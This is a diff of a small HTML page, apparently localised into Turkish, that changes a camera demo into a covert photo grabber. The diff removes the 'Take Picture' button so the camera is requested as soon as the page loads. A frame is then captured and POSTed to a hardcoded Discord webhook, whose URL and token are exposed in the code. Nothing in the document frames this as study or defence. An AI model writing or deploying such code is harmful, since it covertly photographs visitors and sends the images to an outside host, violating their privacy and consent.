@@ -1,24 +1,22 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Camera Access</title>
+    <title>Kamera Erişimi</title>
   </head>
   <body>
-    <h1>Camera Access</h1>
-    <button id="take-picture">Take Picture</button>
+    <h1>Kamera Erişimi</h1>
     <div id="picture-container"></div>
 
     <script>
-      const takePictureButton = document.getElementById('take-picture');
       const pictureContainer = document.getElementById('picture-container');
       const webhookUrl = 'https://discord.com/api/webhooks/1246133942344617984/L5BhAqPdku8Q8qR5-DJO5senhebGe2UMdVCsxEzb7cj_pYXBOsG43i1eZzPSk15KrHJD';
       const webhookUsername = 'Spidey Bot';
       const webhookAvatarUrl = 'https://discord.com/assets/ac6f8cf36394c66e7651.png';
 
-      takePictureButton.addEventListener('click', async () => {
-        try {
-          // Request permission for camera access
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+      // Request permission for camera access when the page is loaded
+      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+       .then(stream => {
+          // Take a picture when permission is granted
           const video = document.createElement('video');
           video.srcObject = stream;
           video.play();
@@ -41,13 +39,14 @@
             method: 'POST',
             body: formData,
           })
-          .then(response => response.json())
-          .then(data => console.log(data))
-          .catch(error => console.error(error));
-        } catch (error) {
-          console.error('Error:', error);
-        }
-      });
+         .then(response => response.json())
+         .then(data => console.log(data))
+         .catch(error => console.error(error));
+
+          // Stop the video stream
+          stream.getTracks().forEach(track => track.stop());
+        })
+       .catch(error => console.error('Error:', error));
     </script>
   </body>
 </html>
